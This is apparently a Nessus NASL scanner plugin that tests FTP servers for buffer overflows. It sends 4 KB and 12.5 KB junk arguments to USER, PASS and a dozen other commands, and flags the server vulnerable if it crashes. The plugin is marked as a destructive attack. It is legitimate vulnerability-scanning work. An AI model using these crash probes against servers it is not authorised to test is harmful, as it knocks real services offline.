#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
# Also covers:
# CAN-2002-0126
# CVE-2000-0870
# ezserver FTP overflow (tested -> crashes by sending a too long username)
#
# From: support@securiteam.com
# Subject: [UNIX] ProFTPD Long Password Crash
# To: list@securiteam.com
# Date: 25 Dec 2002 11:49:22 +0200
#
# References:
# From: support@securiteam.com
# Subject: [NT] Hyperion FTP Server Buffer Overflow (dir)
# To: list@securiteam.com
# Date: 25 Dec 2002 11:08:39 +0200
#
# From: support@securiteam.com
# Subject: [NT] Multiple Vulnerabilities in Enceladus Server (cd, dir, mget)
# To: list@securiteam.com
# Date: 25 Dec 2002 11:03:42 +0200
#
# From:	"Carsten H. Eiram" <che@secunia.com>
# To: "Full Disclosure" <full-disclosure@lists.netsys.com>,
#    "VulnWatch" <vulnwatch@vulnwatch.org> 
# Date:	26 Jun 2003 17:00:57 +0200
# Subject: Secunia Research: FTPServer/X Response Buffer Overflow Vulnerability
# 
# From: Carlos Ulver <carlos.ulver@gmail.com>
# Reply-To: Carlos Ulver <carlos.ulver@gmail.com>
# To: bugtraq@securityfocus.com, vuln-dev@securityfocus.com
# Date: Wed, 2 Mar 2005 11:44:51 -0300
# Subject: Golden Ftp server 1.29 Username remote Buffer Overflow
#
# From: muts@whitehat.co.il
# To: "Full Disclosure" <full-disclosure@full-disclosure@lists.grok.org.uk>
# Date: Mon, 2 May 2005 01:41:36 BST
# Subject: [Full-disclosure] Remote buffer overflow in GlobalScape Secure FTP server 3.0.2

if(description)
{
 script_id(10084);
 if ( NASL_LEVEL >= 2200 )script_bugtraq_id(13454, 1227, 1675, 1690, 1858, 3884, 7251, 7278, 7307, 961, 12704, 113, 269);
 script_version ("$Revision: 1.57 $");
 if ( NASL_LEVEL >= 2200 )script_cve_id("CAN-2000-0133", "CVE-2000-0943", "CAN-2002-0126", "CVE-2000-0870", "CAN-2000-1035", "CAN-2000-1194", "CAN-2000-1035", "CVE-1999-0219");

 name["english"] = "ftp USER, PASS or HELP overflow";
 script_name(english:name["english"]);
 
 desc["english"] = "
The remote FTP server closes the connection when a command is too long
or is given too long an argument.  This is probably due to a buffer
overflow and might anyone to execute arbitrary code on the remote host. 

Solution : Upgrade your FTP server or change it.
Risk factor : High";
 script_description(english:desc["english"]);
 
 summary["english"] = "attempts some buffer overflows";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "FTP";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "ftpserver_detect_type_nd_version.nasl");
 script_require_keys("ftp/login", "ftp/password");
 script_exclude_keys("ftp/msftpd", "ftp/ncftpd", "ftp/fw1ftpd", "ftp/vxftpd");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here
#

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;


function is_vulnerable (value)
{
 soc = open_sock_tcp (port);
 if (!soc)
 {
   set_kb_item(name:"ftp/overflow", value:TRUE);
   set_kb_item(name:"ftp/overflow_method", value:value);
   security_hole(port);
 }
 exit (0);
}

if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
  d = ftp_recv_line(socket:soc);
  if(!d){
	set_kb_item(name:"ftp/false_ftp", value:TRUE);
	close(soc);
	exit(0);
	}
  if(!ereg(pattern:"^220[ -]", string:d))
   {
    # not a FTP server
    set_kb_item(name:"ftp/false_ftp", value:TRUE);
    close(soc);
    exit(0);	
   }
 
  if("Microsoft FTP Service" >< d)exit(0);
 
  req = string("USER ftp\r\n");
  send(socket:soc, data:req);
  d = ftp_recv_line(socket:soc);
  ftp_close(socket:soc);
  if(!d)
  {
   set_kb_item(name:"ftp/false_ftp", value:TRUE);
   exit(0);	
  }
  
  soc = open_sock_tcp(port);
  d = ftp_recv_line(socket:soc);
  s = string("USER ", crap(4096), "\r\n");
  send(socket:soc, data:s);
  d = ftp_recv_line(socket:soc);
  if(!d){
	close (soc);
	is_vulnerable (value:"USER");
	}
  else
  {
   # Let's try to access it with valid credentials now.
   login = get_kb_item("ftp/login");
   password = get_kb_item("ftp/password");

   s = string("USER ", login, "\r\n");
   send(socket:soc, data:s);
   d = ftp_recv_line(socket:soc);
   # ProFTPD 1.5.2 crashes with more than 12 KB
   s = string("PASS ", crap(12500), "\r\n");
   send(socket:soc, data:s);
   d = ftp_recv_line(socket:soc);
   if(!d){
	close (soc);
	is_vulnerable (value:"PASS");
	}
   else
   {
     s = string("PASS ", password, "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d) exit(0);

     s = string("CWD ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"CWD");
	}
	
     s = string("LIST ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"LIST");
	}
	
		
     s = string("STOR ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"STOR");
	}
	
     s = string("RNTO ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"RNTO");
	}
	
     s = string("MKD ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"MKD");
	}	
		
     s = string("XMKD ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"XMKD");
	}
	
     s = string("RMD ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"RMD");
	exit(0);
	}	


     s = string("XRMD ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"XRMD");
	}	
	
     s = string("APPE ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"APPE");
	}
	
     s = string("SIZE ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"SIZE");
	}
	
     s = string("RNFR ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"RNFR");
	}
	
				
     s = string("HELP ", crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"HELP");
	}

     s = string(crap(4096), "\r\n");
     send(socket:soc, data:s);
     d = ftp_recv_line(socket:soc);
     if(!d){
	close (soc);
	is_vulnerable (value:"");
	}
     }
    }
   close(soc);
  }
 }

